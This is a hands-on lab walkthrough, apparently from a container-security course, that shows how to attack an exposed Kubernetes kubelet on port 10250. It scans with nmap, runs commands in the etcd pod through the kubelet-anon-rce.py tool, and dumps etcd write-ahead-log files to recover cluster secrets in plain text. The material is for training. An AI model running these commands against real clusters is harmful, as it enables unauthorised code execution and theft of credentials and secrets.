# **Attacking a K8s Kubelet**

---

### **Lab Image : Kubernetes**

---

#### Step 1:

* Navigate to the `Kubelet Attack` directory on the provisioned server.

```
cd /root/container-training/Kubernetes/Kubelet-Attack
```

* Create a few secrets on the k8s cluster

```commandline
kubectl create ns secret

kubectl create -f secrets.yml

kubectl -n secret get secrets
```

### *Our objective is to compromise the `kubelet`, and steal all configs and secrets by gaining access to `etcd`.*

---

#### Step 2:

* Fetch the IP of the provisioned server

```commandline
serverip
```

* Run an Nmap Scan on the provisioned server to get the list of port and services.

```commandline
# We're running scan against a single port to save some time, but this might take a while
nmap <IP> -sV -p 10250
```

---

#### Step 3:

* Once it's identified that port `10250` is open, try accessing the following URLs on the browser and observe the results

```commandline
https://<serverip>:10250/metrics

https://<serverip>:10250/pods

https://<serverip>:10250/runningpods/
```

* Fetch the `etcd` pod name from the list of running pods

* Using [`kubelet-anon-rce.py`](https://github.com/serain/kubelet-anon-rce), let's gain access to the `etcd` pod and run a few commands.

```commandline
python3 kubelet-anon-rce.py --target <serverip> --port 10250 --namespace kube-system --pod etcd-xxxxxxxxxxx --container etcd --exec "ls /"

python3 kubelet-anon-rce.py --target <serverip> --port 10250 --namespace kube-system --pod etcd-xxxxxxxxxxx --container etcd --exec "ls /etc/kubernetes/pki/etcd/"

python3 kubelet-anon-rce.py --target <serverip> --port 10250 --namespace kube-system --pod etcd-xxxxxxxxxxx --container etcd --exec "ls /var/lib/etcd/member/wal/"
```

---

#### Step 4:

* From the `etcd` pod, let's dump all the data!

```commandline
python3 kubelet-anon-rce.py --target <serverip> --port 10250 --namespace kube-system --pod etcd-xxxxxxxxxxx --container etcd --exec "strings /var/lib/etcd/member/wal/0000000000000000-0000000000000000.wal" >> etcd_dump1.txt

python3 kubelet-anon-rce.py --target <serverip> --port 10250 --namespace kube-system --pod etcd-xxxxxxxxxxx --container etcd --exec "strings /var/lib/etcd/member/wal/0000000000000001-00000000000102aa.wal" >> etcd_dump2.txt
```

### *It can be observed that all data is stored in plain text!!*

---

#### Step 5:

* Delete all the secrets created in *Step 1* by deleting the `secret` namespace

```commandline
kubectl delete ns secret
```

---

### Reading Material/References:

* https://github.com/serain/kubelet-anon-rce

* https://labs.mwrinfosecurity.com/blog/attacking-kubernetes-through-kubelet/

* https://jakubbujny.com/2018/09/02/what-stores-kubernetes-in-etcd/

* https://coreos.com/etcd/docs/latest/dev-guide/interacting_v3.html

* https://github.com/etcd-io/etcd/blob/7f7e2cc79d9c5c342a6eb1e48c386b0223cf934e/Documentation/admin_guide.md
